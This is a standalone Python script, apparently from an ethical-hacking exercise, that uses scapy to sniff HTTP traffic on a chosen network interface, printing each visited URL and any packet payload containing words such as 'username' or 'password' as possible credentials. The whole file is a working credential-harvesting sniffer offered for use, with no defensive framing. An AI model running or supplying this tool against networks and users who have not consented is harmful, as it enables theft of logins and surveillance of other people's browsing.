#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http
from optparse import OptionParser
from pyfiglet import Figlet
from termcolor import cprint


def get_arguments():
    command_parser = OptionParser()
    command_parser.add_option("-i", "--interface", dest="interface", help="Interface from which traffic is flowing.")
    options = command_parser.parse_args()[0]
    if not options.interface:
        command_parser.error("[-] Please specify an interface for traffic sniffing, use --help for more info...")
    return options


def print_banner(text):
    print("-" * 65)
    cprint(Figlet().renderText(text), 'blue', attrs=['bold'])
    print("-" * 65)


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host+packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load


def sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        #print(packet.show())
        url = get_url(packet)
        print("[+] HTTP Request >>> " +url)
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password >>" +login_info+"\n\n")

print_banner("th3 sn1ff3r")
options = get_arguments()

sniff(options.interface)
